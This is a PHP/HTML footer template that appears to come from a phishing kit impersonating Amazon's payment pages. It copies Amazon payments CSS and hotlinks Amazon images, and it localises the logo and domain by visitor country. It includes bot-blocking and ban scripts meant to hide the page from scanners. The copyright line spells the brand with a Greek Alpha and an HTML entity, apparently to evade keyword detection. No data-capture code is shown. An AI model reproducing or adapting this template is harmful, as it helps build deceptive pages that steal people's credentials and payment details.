<?php include ('../bots.php');?>
<?php include ('../blocker.php');?>
<?php include ('../banned.php');?>
<style>.pmts-css-spinner-center{
  position:absolute;
  top:50%;
  left:50%;
  margin-left:-2rem;
  margin-top:-2rem;
  width:4rem;
  height:4rem}
  .pmts-css-spinner-center.pmts-css-spinner-large{
    width:6rem;
    height:6rem;
    margin-left:-3rem;
    margin-top:-3rem}
  .pmts-css-spinner-center.pmts-css-spinner-small{
    width:6rem;
    height:6rem;
    margin-left:-1rem;
    margin-top:-1rem}
  @keyframes pmts-rotate-inner{
    0%{
      transform:rotate(0deg);
      -moz-transform:rotate(0deg);
      -webkit-transform:rotate(0deg)}
    100%{
      transform:rotate(1080deg);
      -moz-transform:rotate(1080deg);
      -webkit-transform:rotate(1080deg)}
  }
  @-webkit-keyframes pmts-rotate-inner{
    0%{
      -webkit-transform:rotate(0deg)}
    100%{
      -webkit-transform:rotate(1080deg)}
  }
  .pmts-css-spinner{
    position:relative;
    width:4rem;
    height:4rem;
    display:inline-block}
  .pmts-css-spinner-large.pmts-css-spinner{
    width:6rem;
    height:6rem}
  .pmts-css-spinner-small.pmts-css-spinner{
    width:2rem;
    height:2rem}
  .pmts-css-spinner-inner,.pmts-css-spinner:after{
    position:absolute;
    left:0;
    top:0;
    right:0;
    bottom:0}
  .pmts-css-spinner:after{
    content:" ";
    margin:15%;
    border-radius:100%}
  .pmts-css-spinner-background-color:after{
    background-color:#fff}
  .pmts-css-spinner.a-size-small:after{
    margin:19%}
  .pmts-css-spinner-inner{
    animation-iteration-count:infinite;
    -webkit-animation-iteration-count:infinite;
    animation-timing-function:linear;
    -webkit-animation-timing-function:linear;
    animation-name:pmts-rotate-inner;
    -webkit-animation-name:pmts-rotate-inner;
    animation-duration:2.5s;
    -webkit-animation-duration:2.5s;
    z-index:-10}
  .pmts-css-spinner-inner:before,.pmts-css-spinner-inner:after{
    position:absolute;
    top:0;
    bottom:0;
    content:" "}
  .pmts-css-spinner-inner:before{
    left:0;
    right:50%;
    border-radius:6rem 0 0 6rem}
  .pmts-css-spinner-inner:after{
    left:50%;
    right:0;
    border-radius:0 6rem 6rem 0}
  .pmts-css-spinner-inner:before{
    background-image:-webkit-linear-gradient(top, rgba(228,121,17,0.55), rgba(228,121,17,0));
    background-image:-moz-linear-gradient(top, rgba(228,121,17,0.55), rgba(228,121,17,0));
    background-image:linear-gradient(to bottom, rgba(228,121,17,0.55), rgba(228,121,17,0))}
  .pmts-css-spinner-inner:after{
    background-image:-webkit-linear-gradient(top, rgba(228,121,17,0.47), #e47911);
    background-image:-moz-linear-gradient(top, rgba(228,121,17,0.47), #e47911);
    background-image:linear-gradient(to bottom, rgba(228,121,17,0.47), #e47911)}
  .pmts-INR-currency-symbol{
    display:inline-block;
    background:url("https://images-na.ssl-images-amazon.com/images/G/31/common/sprites/sprite-site-wide-2.png");
    background-repeat:no-repeat;
    background-position:-16px -333px;
    background-size:320px 455px;
    width:7px;
    height:10px;
    line-height:10px;
    margin-right:1px;
    margin-bottom:0;
    *margin-bottom:-2px;
    _margin-bottom:-2px;
    vertical-align:middle;
    font-size:8px;
    text-decoration:inherit}
  .a-color-price .pmts-INR-currency-symbol{
    background-position:0 -378px;
    height:15px}
  .a-color-success .pmts-INR-currency-symbol{
    background-position:-50px -378px;
    height:15px}
  .a-size-base .a-color-success .pmts-INR-currency-symbol{
    background-position:-40px -333px;
    height:10px}
  .a-color-secondary .pmts-INR-currency-symbol{
    background-position:-31px -378px;
    height:15px}
  .pmts-widget-style-kor [class*="span"]{
    float:none;
    margin-left:0px;
    width:auto}
  .pmts-widget-style-kor h1,.pmts-widget-style-kor h2{
    color:#EE8E00 !important}
  .pmts-widget-style-kor .pmts-sidebar{
    border-width:0 !important;
    background-color:transparent !important}
  .pmts-widget-style-kor .pmts-instrument-headings{
    font-weight:bold !important}
  .pmts-widget-style-kor .pmts-expiry>select{
    width:auto;
    height:auto;
    padding:0}
  .pmts-widget-style-kor .pmts-expiry{
    white-space:nowrap}
  .pmts-portal-widget .pmts-loading-spinner-box{
    width:100px;
    margin:0 auto}
  .pmts-portal-widget .pmts-loading-async-spinner{
    position:relative;
    text-align:center}
  .pmts-portal-widget .pmts-loading-async-spinner-overlay{
    position:fixed;
    height:100%;
    width:100%;
    background-color:rgba(255,255,255,0.5);
    text-align:center;
    top:0;
    left:0;
    z-index:9999}
  .pmts-portal-widget .pmts-loading-widget-async{
    position:fixed;
    height:100%;
    width:100%;
    background-color:rgba(255,255,255,0);
    top:0;
    left:0}
  .pmts-portal-widget .pmts-loading-async-spinner-small{
    height:80px;
    position:relative}
  .pmts-portal-widget .pmts-loading-async-spinner-large{
    width:100px;
    position:relative}
  .pmts-portal-widget .pmts-loading-async-spinner-mobile-centered{
    position:absolute;
    top:50%;
    left:50%;
    margin:-50px}
  .pmts-portal-widget .pmts-account-holder-name,.pmts-portal-widget .pmts-address-field{
    word-wrap:break-word;
    display:inline-block}
  .pmts-portal-widget a.pmts-disable-link{
    cursor:default;
    pointer-events:none}
  .pmts-portal-widget a.pmts-disable-link[disabled]{
    pointer-events:none}
  .pmts-portal-widget .pmts-message,.pmts-portal-widget .pmts-cup-mbcc,.pmts-portal-widget .pmts-hidden{
    display:none}
  .pmts-portal-widget .pmts-address-list-single-column{
    border:1px solid #C8C8C8;
    max-height:200px;
    _height:200px;
    width:310px;
    padding:10px}
  .pmts-portal-widget .pmts-address-list{
    overflow:auto}
  .pmts-portal-widget .pmts-indiv-issuer-image{
    background-repeat:no-repeat;
    display:block;
    float:left;
    height:29px;
    width:45px}
  .pmts-portal-widget .pmts-composite-logo{
    left:0px;
    width:98px}
  .pmts-portal-widget .pmts-issuer-image{
    vertical-align:middle;
    margin-left:5px}
  .pmts-portal-widget .pmts-composite-logo-row{
    height:35px}
  .pmts-portal-widget .pmts-position-static{
    position:static !important}
  .pmts-portal-widget .pmts-primary-expander-heading{
    border-color:#cba957 #bf942a #aa8326;
    background:#f0c14b;
    background:#f4d078;
    background:-moz-linear-gradient(top, #f7dfa5, #f0c14b);
    background:-webkit-gradient(linear, left top, left bottom, color-stop(0%, #f7dfa5), color-stop(100%, #f0c14b));
    background:-webkit-linear-gradient(top, #f7dfa5, #f0c14b);
    background:-o-linear-gradient(top, #f7dfa5, #f0c14b);
    background:-ms-linear-gradient(top, #f7dfa5, #f0c14b);
    background:linear-gradient(top, #f7dfa5, #f0c14b);
    filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#f7dfa5', endColorstr='#f0c14b',GradientType=0);
    *zoom:1;
    -webkit-box-shadow:0 1px 0 rgba(255,255,255,0.4) inset;
    -moz-box-shadow:0 1px 0 rgba(255,255,255,0.4) inset;
    box-shadow:0 1px 0 rgba(255,255,255,0.4) inset}
  .pmts-portal-widget .pmts-primary-expander-heading:hover{
    border-color:#c59f43 #aa8326 #957321;
    background:#f1c861;
    background:-moz-linear-gradient(top, #f5d78e, #eeb933);
    background:-webkit-gradient(linear, left top, left bottom, color-stop(0%, #f5d78e), color-stop(100%, #eeb933));
    background:-webkit-linear-gradient(top, #f5d78e, #eeb933);
    background:-o-linear-gradient(top, #f5d78e, #eeb933);
    background:-ms-linear-gradient(top, #f5d78e, #eeb933);
    background:linear-gradient(top, #f5d78e, #eeb933);
    filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#f5d78e', endColorstr='#eeb933',GradientType=0);
    *zoom:1}
  .pmts-portal-widget .a-changeover.a-changeover-manual.pmts-aui-changeover{
    position:fixed}
  .pmts-portal-widget .a-changeover.a-changeover-manual.pmts-aui-changeover .a-changeover-inner{
    animation:none;
    transform:none;
    transform-origin:none;
    transform-style:none}
  .pmts-portal-widget .pmts-disabled-section{
    background-color:white;
    filter:alpha(opacity=50);
    opacity:0.5;
    -moz-opacity:0.50}
  .pmts-portal-widget .pmts-portal-touch-radio-button-container{
    position:absolute !important;
    top:50%;
    margin-top:-26px}
  .pmts-portal-widget .pmts-view-variant-inline .pmts-sidebar-col,.pmts-portal-widget .pmts-view-variant-inline .pmts-continue-link{
    visibility:hidden;
    display:none}
  .pmts-portal-widget .pmts_box_without_border{
    border:none 0}
  .pmts-portal-widget .pmts-expander-inner-border{
    border-top:0px}
  .pmts-portal-widget .pmts-claim-gc-code{
    padding-left:25px}
  .pmts-portal-widget .pmts-aui-balance-display-string{
    white-space:nowrap}
  .pmts-portal-widget .pmts-portal-other-payment-methods-title-IN{
    padding-left:18px}
  .pmts-portal-widget .pmts_payment_method_table{
    width:auto !important}
  .pmts-portal-widget .pmts-expander-inline-section{
    border:none}
  .pmts-portal-widget .pmts-expander-inline-section>a,.pmts-portal-widget .pmts-expander-inline-section>div{
    padding-left:0;
    border:none}
  .a-offscreen{
    position:absolute;
    left:-1000rem;
    top:auto;
    width:0.1rem;
    height:0.1rem;
    overflow:hidden}
  .a-popover .pmts-loading-spinner-box{
    width:100px;
    margin:0 auto}
  .a-popover .pmts-loading-async-spinner{
    position:relative;
    text-align:center}
  .a-popover .pmts-loading-async-spinner-overlay{
    position:fixed;
    height:100%;
    width:100%;
    background-color:rgba(255,255,255,0.5);
    text-align:center;
    top:0;
    left:0;
    z-index:9999}
  .a-popover .pmts-loading-widget-async{
    position:fixed;
    height:100%;
    width:100%;
    background-color:rgba(255,255,255,0);
    top:0;
    left:0}
  .a-popover .pmts-loading-async-spinner-small{
    height:80px;
    position:relative}
  .a-popover .pmts-loading-async-spinner-large{
    width:100px;
    position:relative}
  .a-popover .pmts-loading-async-spinner-mobile-centered{
    position:absolute;
    top:50%;
    left:50%;
    margin:-50px}
  .a-popover .pmts-cup-mbcc,.a-popover .pmts-message{
    display:none}
  .pmts-button-group-add-address{
    background-color:transparent}
  .pmts-numeric-password-mask{
    -webkit-text-security:disc}
  .pmts-invisible{
    visibility:hidden}
  .pmts-portal-popover-popover{
    position:absolute;
    outline:none}
  .pmts-portal-popover-body{
    height:100%;
    min-height:36px;
    position:relative;
    background-color:#fff;
    margin:0 17px}
  .pmts-portal-popover-popover-sprited .pmts-portal-popover-body .pmts-portal-popover-left-arrow,.pmts-portal-popover-body .pmts-portal-popover-left{
    width:17px;
    height:100%;
    position:absolute;
    top:0;
    left:-17px;
    background-attachment:scroll;
    background-repeat:repeat-y}
  .pmts-portal-popover-popover-sprited .pmts-portal-popover-body .pmts-portal-popover-left{
    background-position:0 top}
  .pmts-portal-popover-popover-sprited .pmts-portal-popover-body .pmts-portal-popover-right-arrow,.pmts-portal-popover-body .pmts-portal-popover-right{
    width:17px;
    height:100%;
    position:absolute;
    top:0;
    right:-17px;
    background-attachment:scroll;
    background-repeat:repeat-y}
  .pmts-portal-popover-popover-sprited .pmts-portal-popover-body .pmts-portal-popover-right{
    background-position:-51px top}
  .pmts-portal-popover-header,.pmts-portal-popover-footer{
    position:relative;
    width:100%}
  .pmts-portal-popover-header *,.pmts-portal-popover-footer *{
    height:26px}
  .pmts-portal-popover-header .pmts-portal-popover-left{
    position:absolute;
    top:0;
    left:0;
    width:34px;
    background-attachment:scroll;
    background-repeat:no-repeat}
  .pmts-portal-popover-popover-sprited .pmts-portal-popover-header .pmts-portal-popover-left{
    background-position:left -2px}
  .pmts-portal-popover-header .pmts-portal-popover-right{
    width:34px;
    position:absolute;
    top:0;
    right:0;
    background-attachment:scroll;
    background-repeat:no-repeat}
  .pmts-portal-popover-popover-sprited .pmts-portal-popover-header .pmts-portal-popover-right{
    background-position:right -2px}
  .pmts-portal-popover-header .pmts-portal-popover-middle{
    margin:0 34px;
    background-attachment:scroll;
    background-repeat:repeat-x}
  .pmts-portal-popover-popover-sprited .pmts-portal-popover-header .pmts-portal-popover-middle{
    background-position:0 -70px}
  .pmts-portal-popover-footer .pmts-portal-popover-left{
    position:absolute;
    top:0;
    left:0;
    width:34px;
    background-attachment:scroll;
    background-repeat:no-repeat}
  .pmts-portal-popover-popover-sprited .pmts-portal-popover-footer .pmts-portal-popover-left{
    background-position:left -40px}
  .pmts-portal-popover-footer .pmts-portal-popover-right{
    width:34px;
    position:absolute;
    top:0;
    right:0;
    background-attachment:scroll;
    background-repeat:no-repeat}
  .pmts-portal-popover-popover-sprited .pmts-portal-popover-footer .pmts-portal-popover-right{
    background-position:right -40px}
  .pmts-portal-popover-footer .pmts-portal-popover-middle{
    margin:0 34px;
    background-attachment:scroll;
    background-repeat:repeat-x}
  .pmts-portal-popover-popover-sprited .pmts-portal-popover-footer .pmts-portal-popover-middle{
    background-position:0 -108px}
  .pmts-portal-popover-popover .pmts-portal-popover-titlebar{
    display:none;
    position:absolute;
    left:0;
    top:0;
    background-color:#EAF3FE;
    border-bottom:1px solid #C2DDF2;
    font-size:14px;
    font-weight:bold;
    margin:8px 18px;
    white-space:nowrap;
    overflow:hidden}
  .pmts-portal-popover-popover .pmts-portal-popover-titlebar.multiline{
    white-space:normal;
    overflow:visible}
  .pmts-portal-popover-popover .pmts-portal-popover-titlebar .pmts-portal-popover-title{
    padding:4px 0;
    margin-left:10px;
    overflow:hidden}
  #pmts-portal-popover-overlay,#pmts-portal-popover-overlay div{
    background-color:#3F4C58;
    width:100%;
    position:absolute;
    top:0;
    left:0;
    z-index:99}
  .pmts-portal-popover-popover .pmts-portal-popover-close{
    position:absolute;
    right:18px;
    top:13px}
  .pmts-portal-popover-popover .pmts-portal-popover-close a{
    padding:5px;
    text-decoration:none;
    outline:none}
  .pmts-portal-popover-popover .pmts-portal-popover-close .pmts-portal-popover-closetext{
    display:none;
    margin-right:5px;
    line-height:1em}
  .pmts-portal-popover-popover .pmts-portal-popover-closebutton{
    display:-moz-inline-box;
    display:inline-block;
    width:15px;
    height:15px;
    background-repeat:no-repeat;
    background-position:0 -136px;
    position:relative;
    overflow:hidden;
    vertical-align:top}
  .pmts-portal-popover-popover .pmts-portal-popover-closebutton span{
    position:absolute;
    top:-9999px}
  .pmts-portal-popover-popover .pmts-portal-popover-close img{
    vertical-align:top}
  .pmts-portal-popover-classic{
    border-top:1px solid #ccc;
    border-left:1px solid #ccc;
    border-bottom:1px solid #2F2F1D;
    border-right:1px solid #2F2F1D;
    background-color:#EFEDD4;
    padding:3px}
  .pmts-portal-popover-classic .pmts-portal-popover-titlebar{
    color:#86875D;
    font-size:12px;
    padding:0 0 3px 0;
    line-height:1em}
  .pmts-portal-popover-classic .pmts-portal-popover-close{
    float:right}
  .pmts-portal-popover-classic .pmts-portal-popover-content{
    clear:both;
    background-color:white;
    border:1px solid #ACA976;
    padding:8px;
    font-size:11px}
  .pmts-portal-popover-popover-unsprited .pmts-portal-popover-body .pmts-portal-popover-left{
    background-image:url(https://images-na.ssl-images-amazon.com/images/G/01/payments-portal/r1/popover/po_left_17._V382372087_.png)}
  .pmts-portal-popover-popover-unsprited .pmts-portal-popover-body .pmts-portal-popover-right{
    background-image:url(https://images-na.ssl-images-amazon.com/images/G/01/payments-portal/r1/popover/po_right_17._V382372081_.png)}
  .pmts-portal-popover-popover-unsprited .pmts-portal-popover-header .pmts-portal-popover-left{
    background-image:url(https://images-na.ssl-images-amazon.com/images/G/01/payments-portal/r1/popover/po_top_left._V382372080_.png)}
  .pmts-portal-popover-popover-unsprited .pmts-portal-popover-header .pmts-portal-popover-right{
    background-image:url(https://images-na.ssl-images-amazon.com/images/G/01/payments-portal/r1/popover/po_top_right._V382372080_.png)}
  .pmts-portal-popover-popover-unsprited .pmts-portal-popover-header .pmts-portal-popover-middle{
    background-image:url(https://images-na.ssl-images-amazon.com/images/G/01/payments-portal/r1/popover/po_top._V382372081_.png)}
  .pmts-portal-popover-popover-unsprited .pmts-portal-popover-footer .pmts-portal-popover-left{
    background-image:url(https://images-na.ssl-images-amazon.com/images/G/01/payments-portal/r1/popover/po_bottom_left._V382372083_.png)}
  .pmts-portal-popover-popover-unsprited .pmts-portal-popover-footer .pmts-portal-popover-right{
    background-image:url(https://images-na.ssl-images-amazon.com/images/G/01/payments-portal/r1/popover/po_bottom_right._V382372083_.png)}
  .pmts-portal-popover-popover-unsprited .pmts-portal-popover-footer .pmts-portal-popover-middle{
    background-image:url(https://images-na.ssl-images-amazon.com/images/G/01/payments-portal/r1/popover/po_bottom._V382372086_.png)}
  .pmts-portal-popover-popover-sprited .pmts-portal-popover-body .pmts-portal-popover-left,.pmts-portal-popover-popover-sprited .pmts-portal-popover-body .pmts-portal-popover-right{
    background-image:url(https://images-na.ssl-images-amazon.com/images/G/01/payments-portal/r1/popover/sprite-v._V382385419_.png)}
  .pmts-portal-popover-popover-sprited .pmts-portal-popover-header .pmts-portal-popover-left,.pmts-portal-popover-popover-sprited .pmts-portal-popover-header .pmts-portal-popover-right,.pmts-portal-popover-popover-sprited .pmts-portal-popover-header .pmts-portal-popover-middle,.pmts-portal-popover-popover-sprited .pmts-portal-popover-footer .pmts-portal-popover-left,.pmts-portal-popover-popover-sprited .pmts-portal-popover-footer .pmts-portal-popover-right,.pmts-portal-popover-popover-sprited .pmts-portal-popover-footer .pmts-portal-popover-middle,.pmts-portal-popover-popover-sprited .pmts-portal-popover-closebutton{
    background-image:url(https://images-na.ssl-images-amazon.com/images/G/01/payments-portal/r1/popover/sprite-h._V382372086_.png)}
  .pmts-portal-popover-popover-sprited .pmts-portal-popover-body .pmts-portal-popover-right-arrow,.pmts-portal-popover-popover-sprited .pmts-portal-popover-body .pmts-portal-popover-left-arrow{
    background-image:url(https://images-na.ssl-images-amazon.com/images/G/01/payments-portal/r1/popover/sprite-arrow-v._V382372087_.png)}
  .pmts-inst-cc-bc-number-popover{
    font-weight:bold}
  .pmts-inst-cc-bc-number-popover .pmts-inst-tail{
    font-weight:normal}
  .pmts-aui-popover-select-address{
    width:30%}
  .pmts-hidden{
    display:none}
</style>
</div>
</div>
</div>
</div>
</div>
</div>
<div id="navFooter">
  <a href="#nav-top" id="navBackToTop">
    <div class="navFooterBackToTop">
    </div>
  </a>
</div>
<div class="navFooterLine navFooterLogoLine">
  <a href="#">
    <img 
         <?php 
    if     ($COUNTRYCODE=="GB"){ echo 'src="../data/country/gb.png"';}
    elseif ($COUNTRYCODE=="IN"){ echo 'src="../data/country/in.png"';}
    elseif ($COUNTRYCODE=="CA"){ echo 'src="../data/country/ca.jpg"';}
    elseif ($COUNTRYCODE=="FR"){ echo 'src="../data/country/fr.png"';}
    elseif ($COUNTRYCODE=="AU"){ echo 'src="../data/country/au.gif"';}
    elseif ($COUNTRYCODE=="BR"){ echo 'src="../data/country/br.jpg';}
    elseif ($COUNTRYCODE=="CN"){ echo 'src="../data/country/cn.jpg"';}
    elseif ($COUNTRYCODE=="IT"){ echo 'src="../data/country/it.jpg"';}
    elseif ($COUNTRYCODE=="JP"){ echo 'src="../data/country/jp.jpg"';}
    elseif ($COUNTRYCODE=="MX"){ echo 'src="../data/country/mx.png"';}
    elseif ($COUNTRYCODE=="ES"){ echo 'src="../data/country/es.jpg"';}
    elseif ($COUNTRYCODE=="DE"){ echo 'src="../data/country/de.svg"';}
    else                       { echo 'src="../data/country/all.gif"';}
    ?> width="130" alt="" height="32" border="0">
  </a>
</div>
<div class="navFooterLine navFooterLinkLine navFooterPadItemLine " >
  <ul>
    <li class="nav_first">
      <a href="#" class="nav_a">Australia
      </a>
    </li>
    <li>
      <a href="#" class="nav_a">Brazil
      </a>
    </li>
    <li>
      <a href="#" class="nav_a">Canada
      </a>
    </li>
    <li>
      <a href="#" class="nav_a">China
      </a>
    </li>
    <li>
      <a href="#" class="nav_a">France
      </a>
    </li>
    <li>
      <a href="#" class="nav_a">Germany
      </a>
    </li>
    <li>
      <a href="#" class="nav_a">India
      </a>
    </li>
    <li>
      <a href="#" class="nav_a">Italy
      </a>
    </li>
    <li>
      <a href="#" class="nav_a">Japan
      </a>
    </li>
    <li>
      <a href="#" class="nav_a">Mexico
      </a>
    </li>
    <li>
      <a href="#" class="nav_a">Spain
      </a>
    </li>
    <li class="nav_last">
      <a href="#" class="nav_a">United Kingdom
      </a>
    </li>
  </ul>
</div>
<br>
<div class="navFooterLine navFooterLinkLine navFooterPadItemLine navFooterCopyright">
  <ul>
    <li class="nav_first">
      <a href="#" class="nav_a">Nutzungsbedingungen
      </a>
    </li>
    <li>
      <a href="#" class="nav_a">Datenschutzerklärung
      </a>
    </li>
    <li>
      <a href="#" class="nav_a">Interessensbasierte Anzeigen
      </a>
    </li>
    <li class="nav_last">&copy; 1996-
      <script>document.write(new Date().getFullYear());
      </script>, &Alpha;m&#97;zon.
      <?php  
if     ($COUNTRYCODE=="GB"){ echo 'co.uk';}
elseif ($COUNTRYCODE=="IN"){ echo 'in';}
elseif ($COUNTRYCODE=="CA"){ echo 'ca';}
elseif ($COUNTRYCODE=="FR"){ echo 'fr';}
elseif ($COUNTRYCODE=="AU"){ echo 'com.au';}
elseif ($COUNTRYCODE=="BR"){ echo 'com.br';}
elseif ($COUNTRYCODE=="CN"){ echo 'cn';}
elseif ($COUNTRYCODE=="IT"){ echo 'it';}
elseif ($COUNTRYCODE=="JP"){ echo 'co.jp';}
elseif ($COUNTRYCODE=="MX"){ echo 'com.mx';}
elseif ($COUNTRYCODE=="ES"){ echo 'es';}
elseif ($COUNTRYCODE=="DE"){ echo 'de';}
else                       { echo 'com';} ?>, Inc. oder seine verbundenen Unternehmen
    </li>
  </ul>
</div>
